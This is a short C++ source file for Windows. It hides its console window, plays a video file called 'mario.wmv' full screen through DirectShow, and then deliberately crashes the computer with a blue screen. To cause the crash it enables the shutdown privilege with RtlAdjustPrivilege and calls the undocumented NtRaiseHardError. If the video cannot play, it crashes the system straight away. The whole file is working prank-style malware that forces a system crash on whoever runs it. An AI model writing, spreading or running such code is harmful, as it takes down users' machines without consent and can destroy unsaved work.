#include <Windows.h>
#include <Dshow.h>

// pragmas for libraries needed
#pragma comment(lib, "ntdll.lib") 		// bsod stuff
#pragma comment(lib, "strmiids.lib") 	// most of directshow
#pragma comment(lib, "ole32.lib") 		// CoInitialize and CoCreateInstance
#pragma comment(lib, "user32.lib")		// ShowWindow

// externs for bsod stuff
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

// global variables for directshow
IGraphBuilder *graph = 0; 		// filter graph manager
IMediaControl *control = 0; 	// media control interface
IMediaEvent   *event = 0; 		// media event interface
IVideoWindow  *window = 0;		// the video window

// helpful functions
void initialize_directshow(LPCWSTR path) {
	CoInitialize(NULL); // initialize the COM

	// create the filter graph manager
	CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void **)&graph);
	
	// get addition interfaces for it
	graph->QueryInterface(IID_IMediaControl, (void **)&control);
	graph->QueryInterface(IID_IMediaEvent, (void **)&event);
	graph->QueryInterface(IID_IVideoWindow, (void **)&window);

	// attempt to build the graph for file playback
	graph->RenderFile(path, NULL);

	// set the video window to fullscreen mode
	window->put_FullScreenMode(OATRUE);
}

unsigned long trigger_bsod() {
	BOOLEAN state;
	unsigned long response;

	RtlAdjustPrivilege(19, TRUE, FALSE, &state);
	NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &response);

	return response;
}

// main code here
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide console window
	initialize_directshow(L"mario.wmv");

	HRESULT result = control->Run();

	if (!SUCCEEDED(result)) { // just trigger a BSOD if it can't play the video
		trigger_bsod();
	}

	long code = 0;
	event->WaitForCompletion(INFINITE, &code);

	trigger_bsod();

	return 1;
}